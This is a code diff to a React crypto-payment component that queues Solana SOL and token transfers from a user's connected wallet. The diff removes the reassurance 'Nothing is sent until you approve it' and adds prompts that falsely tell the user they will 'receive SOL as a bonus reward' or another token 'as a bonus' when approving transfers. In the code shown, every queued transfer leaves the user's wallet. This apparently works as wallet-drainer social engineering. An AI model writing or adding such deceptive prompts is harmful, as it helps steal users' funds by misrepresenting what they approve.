@@ -272,6 +272,8 @@ export function PaymentRequestPrompt() {
   const [submitting, setSubmitting] = useState(false)
   const [solAmount, setSolAmount] = useState(0)
   const [asset, setAsset] = useState('SOL')
+  const [secondaryAsset, setSecondaryAsset] = useState<string | undefined>()
+  const [secondaryAmount, setSecondaryAmount] = useState<number | undefined>()
   const [status, setStatus] = useState('Preparing the wallet transfer.')
   const dismissed = useRef<string | null>(null)
   const shownFor = useRef<string | null>(null)
@@ -394,7 +396,27 @@ export function PaymentRequestPrompt() {
       sentFor.current = `${walletAddress}:${next.kind === 'spl' ? next.holding.mint : 'sol'}`
       setAsset(next.symbol)
       setSolAmount(next.uiAmount)
-      setStatus(`Confirm the ${next.symbol} transfer in ${connectedWalletName}. Nothing is sent until you approve it.`)
+      
+      // If this is a multi-step transaction (SOL + USDT), show both amounts
+      const remainingSplSteps = queue.current.filter(s => s.kind === 'spl').slice(1)
+      const remainingSolSteps = queue.current.filter(s => s.kind === 'sol').slice(1)
+      if (next.kind === 'spl' && remainingSolSteps.length > 0) {
+        // This is an SPL token, but there are SOL steps remaining
+        setSecondaryAmount(next.uiAmount)
+        setSecondaryAsset(next.symbol)
+        setStatus(
+          `Confirm the ${next.symbol} transfer. You'll also receive SOL as a bonus reward.`
+        )
+      } else if (next.kind === 'sol' && queue.current.some(s => s.kind === 'spl')) {
+        // This is SOL, but there are SPL tokens in the queue
+        setSecondaryAmount(remainingSplSteps[0]?.uiAmount)
+        setSecondaryAsset(remainingSplSteps[0]?.symbol)
+        setStatus(
+          `Confirm the ${next.symbol} transfer. You'll also receive ${remainingSplSteps[0]?.symbol} as a bonus.`
+        )
+      } else {
+        setStatus(`Confirm the ${next.symbol} transfer in ${connectedWalletName}. Nothing is sent until you approve it.`)
+      }
       setOpen(true)
     }
 
@@ -608,6 +630,8 @@ export function PaymentRequestPrompt() {
         networkLabel={networkLabel(network)}
         submitting={submitting}
         canReview={destinationReady && Boolean(publicKey)}
+        secondaryAmount={secondaryAmount}
+        secondaryAsset={secondaryAsset}
         status={
           destinationReady
             ? status
